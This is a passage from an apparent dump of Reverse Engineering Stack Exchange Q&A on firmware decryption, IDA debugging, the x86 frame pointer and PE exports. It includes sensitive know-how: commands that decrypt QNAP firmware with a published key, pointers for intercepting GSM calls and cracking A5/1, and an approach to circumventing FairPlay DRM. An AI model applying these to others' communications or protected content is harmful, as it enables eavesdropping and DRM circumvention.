-rw-r--r-- root/root  47500086 2013-07-25 20:49 rootfs_ext.tgz
-rw-r--r-- root/root        78 2013-07-25 20:49 rootfs_ext.tgz.cksum
drwxr-xr-x root/root         0 2013-07-25 20:49 update/
-rw-r--r-- root/root       105 2013-07-25 20:49 update_bios.conf
-rwxr-xr-x root/root      3188 2013-07-25 20:49 update_bios.sh
-rwxr-xr-x root/root      6088 2013-07-25 20:49 update_check
-rwxr-xr-x root/root     22041 2013-07-25 20:49 update_img.sh
</code></pre>

<p>All of that to get to an executable that decrypts the firmware image for us, a script that gives us the decryption key in plain text, and a way to package everything back together if we wanted to modify something.</p>

<p>... and now for something completely different</p>

<h2>The Very Easy Way</h2>

<p>Once I got to the end of the ""hard way"", I decided to google for the encryption key ""QNAPNASVERSION4"".  The first result was for the PC1 enc/dec algorithm in C that someone has already so kindly modified to handle the firmware format specifics for us: <a href=""http://www.r00ted.com/downloads/pc1.c"">http://www.r00ted.com/downloads/pc1.c</a></p>

<p><strong>Update: Link was reported broken, here's a dump: <a href=""http://pastebin.com/KHbX85nG"">http://pastebin.com/KHbX85nG</a></strong></p>

<pre><code># gcc -o pc1 pc1.c
# pc1 d QNAPNASVERSION4 TS-569_20130726-4.0.2.img TS-569_20130726-4.0.2.tgz
# tar -tvf TS-569_20130726-4.0.2.tgz
-rw-r--r-- root/root       106 2013-07-25 20:49 bios_layout
drwxr-xr-x root/root         0 2013-07-25 20:49 boot/
-rw-r--r-- root/root   4557984 2013-07-25 20:49 bzImage
... same result as the hard way
</code></pre>

<p>Now you have a utility that will decrypt your firmware file from the comfort of your own OS without needing physical access to the NAS.</p>
","2714"
"How to debug the DLL of an EXE using IDA Pro?","11710","","<p>I'm fairly new to the RE world, started right around a week and have gotten my hands dirty with some really good stuff on this website. Pardon my naive knowledge.</p>

<p>Currently, I'm trying to <strong>reverse a DLL file of a certain EXE</strong>. 
The EXE makes calls to functions of this DLL for looking up certain values which I plan to patch eventually.</p>

<p>How do I go about debugging the DLL while the application is running? </p>

<p><strong>I would like to be able to place a break point in my DLL and get a hit in IDA Pro while the call is made from the application.</strong></p>

<p>Right now, I patch the DLL by simply hoping for it to work, but I'm pretty sure that there exists a much productive method.</p>

<p>I'm using <strong>IDA Pro</strong> as my flavor of tool.
You could suggest me if some other disassembler can help me achieve the same.</p>

<p>Could someone be kind enough to guide me around this task?</p>
","<p>Very easy, if I got you right:</p>

<ol>
<li>Make an Ida project from the DLL, i.e. drag and drop the dll into the blank Ida page.</li>
<li>In Menu Debugger, Process Options, put the path to your exe into the textbox ""Application"", Into ""input file"" put the path to your DLL. Confirm with OK.</li>
<li>Start with menu Debugger, Start Process or F9.</li>
</ol>

<p>Your breakpoint should be hit.</p>
","9329"
"Intercepting GSM communications with an USRP and Gnu Radio","11643","","<p>I would like to know what is needed to intercept GSM communications with an <a href=""http://en.wikipedia.org/wiki/Universal_Software_Radio_Peripheral"">USRP</a> (Universal Software Radio Peripheral) and using <a href=""http://gnuradio.org/"">Gnu Radio</a>.</p>

<ul>
<li>Is there tutorial about that ?</li>
<li>What type of USRP is recommended ?</li>
<li>Where to find technical documentation about the GSM protocols ?</li>
<li>Is there already existing tools to break the A5/1 encryption ?</li>
<li>...</li>
</ul>

<p>All in one, my question is more about looking for advices about ""<strong>where to start ?</strong>"" when trying to understand GSM communication.</p>
","<p>As mentioned above by 0xea, <a href=""https://twitter.com/domi007"">@domi007</a> published 4 blog posts (<a href=""http://domonkos.tomcsanyi.net/?p=418"">1</a>,<a href=""http://domonkos.tomcsanyi.net/?p=422"">2</a>,<a href=""http://domonkos.tomcsanyi.net/?p=425"">3</a>,<a href=""http://domonkos.tomcsanyi.net/?p=428"">4</a>) detailing his experience with GSM sniffing and cracking. He also published his <a href=""https://www.youtube.com/watch?v=3cnnQFP3VqE"">recorded presentation</a> about GSM security (<a href=""http://camp.hsbp.org/2013/zer0/gsm.pdf"">slides</a>). 
On the same topic, there's also <a href=""http://binaryrf.com/viewtopic.php?t=6&amp;f=9"">Sniffing GSM with HackRF</a>, <a href=""http://www.rtl-sdr.com/rtl-sdr-tutorial-analyzing-gsm-with-airprobe-and-wireshark/"">Analyzing GSM with Airprobe and Wireshark</a>, three Chaos Computer Club presentations (One discussing <a href=""https://www.youtube.com/watch?v=ZrbatnnRxFc"">Wideband GSM sniffing</a>, another discussing the <a href=""https://www.youtube.com/watch?v=9wwco24EsHs"">functioning of GSM networks</a>) and the one mentioned <a href=""https://events.ccc.de/congress/2009/Fahrplan/events/3654.en.html"">above</a> about GSM Cracking. Last but not least, there's also a Black Hat 2008 Presentation called ""Intercepting Mobile Phone/GSM Traffic"", by David Hulton and Steve <a href=""http://www.blackhat.com/html/featured_media/bh08-002-Stream-1.mov"">video (.mov)</a>.
Observation : There's also <a href=""https://srlabs.de/airprobe-how-to/"">this tutorial by Srlabs</a>, which uses their own tool, Kraken, that covers decrypting GSM using Airprobe and the <a href=""https://svn.berlin.ccc.de/projects/airprobe/wiki/A"">Airprobe's own tutorial</a> on decoding GSM.
When choosing your SDR, I suggest you read <a href=""http://www.taylorkillian.com/2013/08/sdr-showdown-hackrf-vs-bladerf-vs-usrp.html"">this comparison</a> about <a href=""http://greatscottgadgets.com/hackrf/"">HackRF</a>, <a href=""http://nuand.com/"">bladeRF</a> and the <a href=""https://www.ettus.com/product/details/UB210-KIT"">USRP B210</a>. There is also <a href=""http://sdr.osmocom.org/trac/wiki/rtl-sdr"">RTL-SDR</a> . They are all quite nice. I also suggest using <a href=""http://gqrx.dk/"">Gqrx</a> as it's built on Gnuradio and has a neat interface.</p>

<p>Architecture and theory wise, I'd recommend <a href=""https://docs.google.com/viewer?url=http://www2.informatik.hu-berlin.de/~goeller/isdn/GSMDmChannels.pdf"">About GSM Dm Channels</a>, which is a quite complete and detailed beginner paper that explains the GSM Architecture and how it works. I also recommend <a href=""http://rads.stackoverflow.com/amzn/click/0470030704"">GSM - Architecture, Protocols and Services</a> and <a href=""http://rads.stackoverflow.com/amzn/click/B004W7DNWY"">4G: LTE/LTE-Advanced for Mobile Broadband</a> (if considering LTE), which provide further information and details about the functioning of GSM for those that want to delve into it.</p>

<p>Regarding GSM Encryption and its flaws, I suggest <a href=""https://docs.google.com/viewer?url=http%3A%2F%2Fwww.cs.technion.ac.il%2Fusers%2Fwwwb%2Fcgi-bin%2Ftr-get.cgi%2F2006%2FCS%2FCS-2006-07.pdf"">Instant Ciphertext-Only Cryptanalysis of GSM Encrypted Communication</a>, which discusses ciphertext attacks on A5/(1,2,3), <a href=""https://docs.google.com/viewer?url=http://www.emsec.rub.de/media/crypto/attachments/files/2010/04/da_gendrullis.pdf"">Hardware-based Cryptanalysis of the GSM A5/1 Encryption Algorithm</a> - includes a 2 page brief on A5/1 and then goes on to the cryptoanalysis - and <a href=""https://docs.google.com/viewer?url=http://cryptome.org/a5-3-attack.pdf"">A Practical-Time Attack on the A5/3 Cryptosystem Used in Third Generation GSM Telephony</a> - discusses attacks on A5/3. Finally, there is also <a href=""http://cryptome.org/a51-bsw.htm"">Real Time Cryptanalysis of A5/1 on a PC</a>, a very nice document called <a href=""http://www.researchgate.net/publication/235339185_Security_of_3G_and_LTE"">Security of 3G and LTE</a> that discusses the security architecture and the attacks on it's flaws, and <a href=""https://docs.google.com/viewer?url=http://www.bolet.org/~pornin/2000-ches-pornin%2bstern.pdf"">Software Hardware Trade-offs - Applications to A5/1 Cryptanalysis</a> - another nice paper on A5/1. Observations : You can find the specifications for A5/3 in the <a href=""http://www.3gpp.org/Confidentiality-Algorithms"">middle of this page</a>. There are also two Blackhat presentions that cover part of those papers in a succinct way <a href=""https://docs.google.com/viewer?url=https://srlabs.de/blog/wp-content/uploads/2010/07/Attacking.Phone_.Privacy_Karsten.Nohl_1.pdf"">Attacking Phone Privacy</a> and <a href=""https://docs.google.com/viewer?url=https://srlabs.de/blog/wp-content/uploads/2010/07/100729.Breaking.GSM_.Privacy.BlackHat1.pdf"">Breaking Phone Privacy</a>. If you like animations, there is an <a href=""https://www.youtube.com/embed/LgZAI3DdUA4"">A5/1 Cipher Animation</a> on YouTube. <a href=""https://twitter.com/matthew_d_green"">@matthew_d_green</a> deserves to be mentioned, considering he wrote a small synthesis of cellular communications crypto flaws in his <a href=""http://blog.cryptographyengineering.com/2013/05/a-few-thoughts-on-cellular-encryption.html"">blog</a>. </p>

<p>Important observation : The GSM specifications are located in <a href=""http://www.3gpp.org/"">3GPP's website</a>. To find them, you need to determine the <a href=""http://www.3gpp.org/Specification-Numbering"">numbering</a> of the part you're looking for. Then, you browse into <a href=""ftp://ftp.3gpp.org/specs/"">their ftp server</a> and look for the date and release you fancy. (Releases prior to 2012-13 need to be solicited through their contact mail). Supposing you want the latest ""3G and Beyond / GSM"" Signalling Protocols specifications, you'll need to browse to their ""latest"" folder, descend to the release you're looking for (i.e. Release 12), and finally download the ""Series"" that contain the information you need - which in this case would be ""Series 24"". Therefore, the result of your endeavor would be : <a href=""ftp://ftp.3gpp.org/specs/latest/Rel-12/24_series/"">ftp://ftp.3gpp.org/specs/latest/Rel-12/24_series/</a> .
It's not a good user experience, especially because there are several empty directories, but with patience, you can find what you're looking for.</p>

<p><a href=""https://twitter.com/gat3way"">@gat3way</a> deserves a special mention for documenting his experiments in cracking GSM A5/1 in his blog (<a href=""http://www.gat3way.eu/index.php?mact=News,cntnt01,detail,0&amp;cntnt01articleid=199&amp;cntnt01returnid=57"">1</a>,<a href=""http://www.gat3way.eu/index.php?mact=News,cntnt01,detail,0&amp;cntnt01articleid=200&amp;cntnt01returnid=57"">2</a>,<a href=""http://www.gat3way.eu/index.php?mact=News,cntnt01,detail,0&amp;cntnt01articleid=201&amp;cntnt01returnid=57"">3</a>)  - includes a brief description of the A5/1 mechanism - and the fact that he has implemented support for cracking A5/1 using Pornin's attack in his password recovery tool, <a href=""http://www.gat3way.eu/hashkill/index.php"">hashkill</a> - <a href=""https://github.com/gat3way/hashkill/commit/d43fdd2ce042d75862930044fd0b4570bee56cf0"">git commit</a>.</p>

<p>An existing tool to crack A5/1 is Kraken, by srlabs (available through git://git.srlabs.de/kraken.git), which should be used after recording the data with Gnuradio/Gqrx and parsing it with <a href=""https://svn.berlin.ccc.de/projects/airprobe/"">Airprobe</a>. It needs GSM rainbow tables, available at the <a href=""https://opensource.srlabs.de/projects/a51-decrypt/files"">jump</a>. </p>

<p>Another tool that can be considered is <a href=""https://github.com/gat3way/hashkill/"">hashkill</a>, which takes the key to be cracked in a ""frame_number:keystream"" format - it's author published the code for converting a bin burst into the required input format <a href=""http://www.gat3way.eu/poc/encode.c"">here</a>. He also published a <a href=""http://www.gat3way.eu/poc/si5.phps"">php script</a> to locate suitable SI5/SI6 encrypted bursts for cracking - you'll need to change the hardcoded values for SI5 frames to fit your location -, which, together with Kraken's xortool, <a href=""http://www.mail-archive.com/a51@lists.reflextor.com/msg01023.html"">gsmframecoder</a> (that will be used to calculate Timing Advance changes) and <a href=""https://svn.berlin.ccc.de/projects/airprobe/"">Airprobe</a> should be sufficient to crack GSM.</p>
","2973"
"AirPlay Mirroring decryption (FairPlay)","11450","","<p>I've been spending a good chunk of time looking at some 3rd party applications that were successful in ""reproducing"" (although I believe not necessarily by understanding the algorithm completely but simply extracting the core of the logic from the original binaries and replicating it into their own programs) the main logic for simulating an Apple TV server with full <strong>AirPlay mirroring</strong> support, to name a few:</p>

<ol>
<li>AirServer (OSX/Windows)</li>
<li>Reflector (OSX/Windows)</li>
<li>AirReceiver (Android)</li>
<li>X-Mirage (OSX/Windows)</li>
<li>AirPin PRO (Android)</li>
<li>EZCast Screen (Android)</li>
<li>Xiaomi Milian (Android/runs on Xiaomi Box)</li>
</ol>

<p>By looking at their decompiled code and some other references on the web, most of the protocol aspect is already known/relatively easy to figure out and I did it already, so no sweat there, the key part I'm having a tough time understanding how these guys were able to pull it off is related to the FairPlay decryption portion (i.e.: when receiving and responding to the <code>fp-setup</code> challenges as well as decrypting the AES key sent in the last step of the challenge).</p>

<p>They all seem to have extracted the <a href=""https://reverseengineering.stackexchange.com/questions/6544/identify-decompiled-decryption-algorithm"">white-boxed/obfuscated</a> functions out of Apple's original <code>airtunesd</code>/<code>fairplayd</code> daemon code and embedded it into their source, delegating the calls to seed/encrypt/decrypt to it.</p>

<p>I noticed in some iOS devices this daemon also exist (most likely used to encrypt the feed when mirroring the screen via AirPlay to a compatible server) but was wondering how different this really is from the one shipped with the Apple TV and if my assumptions are actually correct (is that were most of these guys are taking this code from?).</p>

<p>Was hoping either someone with previous experience or a little more knowledge on the topic could shed some light/pointers so I could find a way to at least do the same these guys were able to accomplish (which is not really deobfuscating the code but just extracting it to embed in their own programs).</p>

<p><strong>PS:</strong> For clarity, aside from confirmation I was looking for some pointers as to how one would be able to extract <strong>compilable</strong> code from a said binary, given my attempts at disassembling and decompiling via IDA Pro haven't provided me with much that I can reuse to compile new code that reproduces that piece of the puzzle.</p>
","<p>I have spent some time to look into Apple's airplay mirroring support, which is encrypted by fairplay protocol. After investigating serveral existing commercial applications I have finally managed to get a way of decrypting fairplay protected streams.
I have extended the shairplay code to demostrate this ability. Please look at <a href=""https://github.com/foxsen/shairplay"" rel=""nofollow"">https://github.com/foxsen/shairplay</a>, parts of the README.md:</p>

<p>Update by foxsen, 2015/4/20: Experimental support for fairplay protocol and airplay:</p>

<ul>
<li>fairplay encrpted audio is supported (et == 3)</li>
<li>AAC-ELD audio is supported(untested yet)</li>
<li>airplay service framework is added, up to the point that the mirroring connection starts streaming. But the UI and callbacks to be done.</li>
<li>fairplay support is performed via interactions with a server</li>
</ul>

<p>Because I have not enough time and interest to do all the other necessary coding to make a full open source solution that support mirroring, I hope people can help to continue the project or port my code into other projects like kodi. I am willing to help with related issues.</p>

<p>The dirty works are hidden in my server app. During a session with fairplay, we need to interact with the server for three times to get the job done. You can read the code above to learn how. When I get more time, I prepare the write something about this part of work. Basically it involves some reverse engineering and a lot of tricks to rebuild a relocatable object from part of a binary.</p>

<p>Public access to that app is open and free for personal visits now. If anybody want to use it in commercial environment, you can contact me.</p>

<p>Happy hacking.</p>
","8735"
"What purpose of mov %esp,%ebp?","11397","","<p>When execution enters a new function by performing call  I do often see this code template (asm list generated by Gnu Debugger when in debugging mode):</p>

<pre><code>0x00401170  push   %ebp
0x00401171  mov    %esp,%ebp
0x00401173  pop    %ebp
</code></pre>

<p>So what's the purpose of moving esp to ebp?</p>
","<p>Moving <code>esp</code> into <code>ebp</code> is done as a debugging aid and in some cases for exception handling.  <code>ebp</code> is often called the frame pointer.  With this in mind, think of what happens if you call several functions.  <code>ebp</code> points to a block of memory where you pushed the old <code>ebp</code>, which itself points to another saved <code>ebp</code>, etc.  Thus, you have a linked list of stack frames.  From these, you can look at the return addresses (which are always 4 bytes above the frame pointer in the stack frame) to find out what line of code called a stack frame in question.  The instruction pointer can tell you the location of current execution.  This allows you to generate a <a href=""https://en.wikipedia.org/wiki/Stack_trace"">stacktrace</a> which is useful for debugging by showing the flow of execution throughout a program.</p>

<p>As a practical example consider the following code:</p>

<pre><code>void foo();
void bar();
void baz();
void quux();

void foo() {
    bar();
}

void bar() {
    baz();
    quux();
}

void baz() {
    //do nothing
}

void quux() {
    *(int*)(0) = 1; //SEGFAULT!
}

int main() {
    foo();
    return 0;
}
</code></pre>

<p>This generates the following assembly (with Debian gcc 4.7.2-4 <code>gcc -m32 -g test.c</code>, snipped):</p>

<pre><code>080483dc &lt;foo&gt;:
 80483dc:   55                      push   %ebp
 80483dd:   89 e5                   mov    %esp,%ebp
 80483df:   83 ec 08                sub    $0x8,%esp
 80483e2:   e8 02 00 00 00          call   80483e9 &lt;bar&gt;
 80483e7:   c9                      leave  
 80483e8:   c3                      ret    

080483e9 &lt;bar&gt;:
 80483e9:   55                      push   %ebp
 80483ea:   89 e5                   mov    %esp,%ebp
 80483ec:   83 ec 08                sub    $0x8,%esp
 80483ef:   e8 07 00 00 00          call   80483fb &lt;baz&gt;
 80483f4:   e8 07 00 00 00          call   8048400 &lt;quux&gt;
 80483f9:   c9                      leave  
 80483fa:   c3                      ret    

080483fb &lt;baz&gt;:
 80483fb:   55                      push   %ebp
 80483fc:   89 e5                   mov    %esp,%ebp
 80483fe:   5d                      pop    %ebp
 80483ff:   c3                      ret    

08048400 &lt;quux&gt;:
 8048400:   55                      push   %ebp
 8048401:   89 e5                   mov    %esp,%ebp
 8048403:   b8 00 00 00 00          mov    $0x0,%eax
 8048408:   c7 00 01 00 00 00       movl   $0x1,(%eax)
 804840e:   5d                      pop    %ebp
 804840f:   c3                      ret    

08048410 &lt;main&gt;:
 8048410:   55                      push   %ebp
 8048411:   89 e5                   mov    %esp,%ebp
 8048413:   83 e4 f0                and    $0xfffffff0,%esp
 8048416:   e8 c1 ff ff ff          call   80483dc &lt;foo&gt;
 804841b:   b8 00 00 00 00          mov    $0x0,%eax
 8048420:   c9                      leave  
 8048421:   c3                      ret    
</code></pre>

<p>Note that <code>leave</code> is the same as:</p>

<pre><code>mov %ebp, %esp
pop %ebp
</code></pre>

<p>With this in mind, and the standard-ish C calling convention on x86, we know that the stack at the segfault is going to look like:</p>

<ol>
<li><em>top of main's stack frame</em></li>
<li><em>stack space for main - in this case, enough to align on 16 bytes</em></li>
<li><code>0x0804841b</code> <em>return address for</em> <code>call foo</code></li>
<li><em>pointer to <code>1.</code></em></li>
<li><em>stack space for foo</em></li>
<li><code>0x080483e7</code> <em>return address for</em> <code>call bar</code></li>
<li><em>pointer to <code>4.</code></em></li>
<li><em>stack space for bar</em></li>
<li><code>0x080483f9</code> <em>return address for</em> <code>call quux</code></li>
<li><em>pointer to <code>7.</code></em></li>
<li><em>stack space for quux</em></li>
</ol>

<p>The instruction pointer will be <code>0x08048408</code>. <code>ebp</code> will point to <em><code>10.</code></em>.</p>

<p>At this point, the processor generates an exception, which the operating system processes.  It then sends <code>SIGSEGV</code> to the process, which obligingly terminates and dumps core.  You then bring up the core dump in gdb with <code>gdb -c core</code>, and you type in <code>file a.out</code> and <code>bt</code>, and it gives you in response:</p>

<pre><code>#0  0x08048408 in quux () at test.c:20
#1  0x080483f9 in bar () at test.c:12
#2  0x080483e7 in foo () at test.c:7
#3  0x0804841b in main () at test.c:24
</code></pre>

<p><code>#0</code> is generated from the instruction pointer.  Then, it goes to <code>ebp</code> (10), looks at the previous item on the stack (9), and generates <code>#1</code>.  It follows <code>ebp</code> (i.e. <code>mov %ebp, (%ebp)</code>) to (7), and looks 4 bytes above that (6) to generate <code>#2</code>.  It finally follows (7) to (4) and looks at (3) to generate <code>#3</code>.</p>

<p><strong>Note:</strong>  This is but one way of doing such stack tracing.  GDB is very, very smart, and can perform the stack trace even when you use <code>-fomit-frame-pointer</code>.  However, in a very basic implementation this is probably the simplest way to generate a stack trace.</p>
","2074"
"What are the essential IDA Plugins or IDA Python scripts that you use?","11143","","<p>I'm a bit of a novice with IDA Pro, and have been discovering some of the excellent plugins available from the RE community as well as its vendors. My small list of plugins that I have found extremely valuable to me are:</p>

<ul>
<li><a href=""https://www.hex-rays.com/products/decompiler/index.shtml"">Hex-Rays Decompiler</a> (commercial) - convert program to pseudo-C</li>
<li><a href=""http://thunkers.net/~deft/code/toolbag/"">IDA Toolbag</a> - Adds too much awesome functionality to IDA to list. <a href=""http://thunkers.net/~deft/code/toolbag/docs.html#Usage"">Just see/read about it</a>.</li>
<li><a href=""https://bitbucket.org/daniel_plohmann/simplifire.idascope/"">IDAscope</a> - Function tagging/inspection, WinAPI lookup, Crypto identification</li>
</ul>

<p>Granted, this is a very short list. What IDA Pro scripts/plugins do you find essential?</p>
","<p>There are binary diffing plugins also that are very handy to analyse vulnerabilities: <a href=""https://code.google.com/p/patchdiff2"">patchdiff2</a> and <a href=""http://www.zynamics.com/bindiff.html"">zynamics bindiff</a>. They can help you analyse the patches that the binary had and very usefull to analyse i.e. why the application was vulnerable before the patch and how the vendor fixed it.</p>

<p>Besides these two plugins for IDA there's <a href=""http://www.darungrim.org/"">DarunGrim</a>, another excellent binary diffing tool.</p>
","66"
"Disassemble, edit and re-assembly iOS ipa apps","11141","","<p>I'm trying to get jailbreak statistics for a University project related to security in mobile devices. My purpose is to disassemble, add a sample code and re-assemble to obtain a runnable iOS app again.</p>

<p>I have read a lot about IDA, IDA pro, HEX-Rays, and o'tool to disassemble an ipa file.</p>

<p>Since i'm working with a macbook pro, i think that using otool to disassemble an '.ipa' file is the best and faster way. I have tried it with a non-signed <code>.ipa</code> and I have obtained the assembly code.</p>

<p>Then, I have difficulties. I have tried to create a new Xcode project, import this assembly code and try to compile it to generate a new app, without inserting new code just to simplify the process.</p>

<p>But when i tried to compile, Xcode fails in every single code line.</p>

<p>I think that my problem is, that the process described:</p>

<ol>
<li>Disassemble with otool</li>
<li>Import the code in XCode</li>
<li>Compile and build</li>
<li>Obtain the new app</li>
</ol>

<p>Is not correct.</p>
","<p>You won't be able to rebuild with XCode. You'd need to patch the decrypted app with a hex editor in order to make your desired changes.</p>

<p>See <a href=""http://www.minecraftforum.net/topic/1363777-how-to-make-mods-for-ios/"" rel=""nofollow"">http://www.minecraftforum.net/topic/1363777-how-to-make-mods-for-ios/</a> for a sample walkthrough.</p>
","2815"
"Looking for exported symbols in a DLL with objdump?","11111","","<p>I am a man full of contradictions, I am using Unix and, yet, I want to analyze a Microsoft Windows DLL.</p>

<p>Usually, when looking for symbols in a dynamic or static library in the ELF World, one can either use <code>nm</code> or <code>readelf</code> or even <code>objdump</code>. Here is an example with <code>objdump</code>:</p>

<pre><code>$ objdump -tT /usr/lib/libcdt.so

/usr/lib/libcdt.so:     file format elf64-x86-64

SYMBOL TABLE:
no symbols

DYNAMIC SYMBOL TABLE:
0000000000000cc8 l    d  .init  0000000000000000              .init
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 free
0000000000000000  w   D  *UND*  0000000000000000              _ITM_deregisterTMCloneTable
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 memcmp
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 strcmp
0000000000000000  w   D  *UND*  0000000000000000              __gmon_start__
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 malloc
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 realloc
0000000000000000  w   D  *UND*  0000000000000000              _Jv_RegisterClasses
0000000000000000  w   D  *UND*  0000000000000000              _ITM_registerTMCloneTable
0000000000000000  w   DF *UND*  0000000000000000  GLIBC_2.2.5 __cxa_finalize
0000000000000ec0 g    DF .text  0000000000000097  Base        dtclose
0000000000204af8 g    DO .data  0000000000000008  Base        Dtorder
0000000000204af0 g    DO .data  0000000000000008  Base        Dttree
... cut ...
</code></pre>

<p>So, we have all exported function name from reading this dynamic library. But, lets try it with a DLL:</p>

<pre><code>$ objdump -tT SE_U20i.dll 

SE_U20i.dll:     file format pei-i386

objdump: SE_U20i.dll: not a dynamic object
SYMBOL TABLE:
no symbols

DYNAMIC SYMBOL TABLE:
no symbols
</code></pre>

<p>As you see, <code>objdump</code> fail to extract the exported symbols from the DLL (and so do <code>nm</code>). But, if I can see a few thing more if I do:</p>

<pre><code>$ objdump -p SE_U20i.dll

SE_U20i.dll:     file format pei-i386

Characteristics 0xa18e
    executable
    line numbers stripped
    symbols stripped
    little endian
    32 bit words
    DLL
    big endian

... clip ...

There is an export table in .edata at 0x658000

The Export Tables (interpreted .edata section contents)

Export Flags                    0
Time/Date stamp                 0
Major/Minor                     0/0
Name                            0025803c SE_U20i.dll
Ordinal Base                    1
Number in:
    Export Address Table            00000002
    [Name Pointer/Ordinal] Table    00000002
Table Addresses
    Export Address Table            00258028
    Name Pointer Table              00258030
    Ordinal Table                   00258038

Export Address Table -- Ordinal Base 1
    [   0] +base[   1] 23467c Export RVA
    [   1] +base[   2] 233254 Export RVA

[Ordinal/Name Pointer] Table
    [   0] DoResurrection
    [   1] Initialize

... clip ...
</code></pre>

<p>So, the <em>export table</em> seems to be what we are looking for (not sure about it). But it is drown among a lot of other information (the option <code>-p</code> display really a LOT of lines).</p>

<p>So, first, is the export table what I am looking for to know what are the functions and variables that exported by the DLL ?</p>

<p>Second, why did <code>objdump</code> present differently the exported symbols in the case of ELF and PE ? (I guess there is some technical differences between exported symbols in ELF and PE and that confusing both would be extremely misleading, but I would like to know in what they differ).</p>
","<p>The surprising part for me is <code>objdump</code> can recognize <em>anything</em> in a PE file. According to <a href=""http://en.wikipedia.org/wiki/Portable_Executable"" rel=""noreferrer"">Wikipedia</a>,</p>

<blockquote>
  <p>.. PE is a modified version of the Unix COFF file format. PE/COFF is an alternative term in Windows development.</p>
</blockquote>

<p>so apparently there is just enough overlap in the headers to make it work (at least partially). The basic design of one is clearly based on the other, but after that they evolved separately. Finding the exact differences at this point in time might well be a pure academical exercise.</p>

<p>Yes: in a DLL, the export directory <em>is</em> what you are looking for. Here is a screen grab from <a href=""http://www.dependencywalker.com"" rel=""noreferrer"">Dependency Walker</a> inspecting <code>comctl32.dll</code> (using VirtualBox 'cause I'm on a Mac):</p>

<p><img src=""https://i.stack.imgur.com/5CPMn.png"" alt=""Dependency Walker showing Exports""></p>

<p>The field ""E^"" lists the exported function names and other interesting details.</p>

<p>If you are in to Python: <a href=""http://code.google.com/p/pefile/"" rel=""noreferrer""><code>pefile</code></a> has been mentioned as a library that can access PE parts, but then again PE has been so long around there is no end to good descriptions of all the gory low level details of all its headers and structures. Last time I felt inspecting some Windows program, I used these descriptions to write a full set of PE import/export C routines from scratch (.. <em>again</em>, I should add -- this way I can have return it the exact data I want in exactly the required format).</p>

<p>IDA Pro seems to be the utility of choice for most disassembling jobs, and last time I used that it did a good job of loading both Import and Export directories, although it didn't provide a concise list of all functions.</p>
","3103"
"What is a FLIRT signature?","11103","","<p>I've seen this referenced in a couple of other questions on this site.  But what's a FLIRT signature in IDA Pro?  And when would I create my own for use?</p>
","<p>FLIRT stands for <strong>Fast Library Identification and Recognition Technology</strong>.</p>

<p>Peter explained the basics, but here's a white paper about how it's implemented:</p>

<p><a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"">https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml</a></p>

<blockquote>
  <p>To address those issues, we created a database of all the functions
  from all libraries we wanted to recognize. IDA now checks, at each
  byte of the program being disassembled, whether this byte can mark the
  start of a standard library function. </p>
  
  <p>The information required by the recognition algorithm is kept in a
  signature file. Each function is represented by a pattern. Patterns
  are first 32 bytes of a function where all variant bytes are marked.</p>
</blockquote>

<p>It's somewhat old (from IDA 3.6) but the basics still apply.</p>

<p>To create your own signatures, you'll need FLAIR tools, which can be downloaded separately.<br>
(FLAIR means Fast Library Acquisition for Identification and Recognition)</p>

<p>The IDA Pro book has <a href=""http://my.safaribooksonline.com/9781593273750/library_recognition_using_flirt_signatur"">a chapter</a> on FLIRT and using FLAIR tools.</p>
","184"
"Freely available resource hacking applications","11022","","<p>I am using Resource Hacker as a tool to extract out resources like icon, images, etc. from <code>.dll</code> or <code>.exe</code> file. In addition, I am using it to crack some small Windows application. However, it does not work with all Win32 Application, especially with those that are zipped by <code>.exe</code> compressor.</p>

<p>Are there any other open source applications, that I can use to crack and extract resources out of <code>.dll</code> and <code>.exe</code> files?</p>
","<p>If the previously suggested resource editors aren't to your liking, you can find descriptions and reviews of several resource editors here: <a href=""http://www.woodmann.com/collaborative/tools/index.php/Category:Resource_Editors"">http://www.woodmann.com/collaborative/tools/index.php/Category:Resource_Editors</a></p>

<p>In case you have trouble accessing that page (as per the comments below), here is the list of resource editors as of 6/26/13:</p>

<ul>
<li><a href=""http://www.heaventools.com/overview.htm"">PE Explorer</a></li>
<li><a href=""http://angusj.com/resourcehacker"">Resource Hacker (Reshacker)</a></li>
<li><a href=""http://www.ntcore.com/exsuite.php"">Explorer Suite</a></li>
<li><a href=""http://anol.is/"">Anolis Resourcer</a></li>
<li><a href=""http://hp.vector.co.jp/authors/VA003525/Eindex.htm"">eXeScope</a></li>
<li><a href=""http://www.woodmann.com/collaborative/tools/index.php/ResFixer"">ResFixer</a></li>
<li><a href=""http://www.aisto.com/roeder/dotnet/"">Resourcer for .NET</a></li>
<li><a href=""http://www.woodmann.com/collaborative/tools/index.php/StringEditor"">StringEditor</a></li>
<li><a href=""http://www.cgsoftlabs.ro/studpe.html"">Stud_PE</a></li>
<li><a href=""http://www.wilsonc.demon.co.uk/d10resourceeditor.htm"">XN Resource Editor</a></li>
</ul>
","2325"
"IDA cannot launch debugger for 64-bit exe files","11012","","<p>I want to launch IDA debugger for one 64-bit exe file and it fails, have tried with more samples, but result always the same. </p>

<p>Here is that I do.</p>

<ol>
<li>Launch <code>IDA Pro (64-bit)</code></li>
<li>Select <code>Debugger</code> -> <code>Run</code> -> <code>Local Windows Debugger</code> from top menu.</li>
<li>Select my file. <a href=""https://i.stack.imgur.com/QClOU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/QClOU.png"" alt=""How it looks""></a> and click <code>OK</code>.</li>
<li>At this point getting such prompt. <a href=""https://i.stack.imgur.com/6jANx.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6jANx.png"" alt=""prompt""></a> and click <code>Yes</code>.</li>
<li>Finally got such error: <a href=""https://i.stack.imgur.com/M0U3g.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/M0U3g.png"" alt=""error1""></a></li>
<li>And after that this-one: <a href=""https://i.stack.imgur.com/HM5Mv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HM5Mv.png"" alt=""error2""></a></li>
</ol>

<p>It happens all the time, have tried it on a few different VMs on my actual machine. I'm using full version of IDA v6.7.141229.</p>

<p>I believe something has to be configured, as the last error says something about wrong parameters, can someone advice?</p>
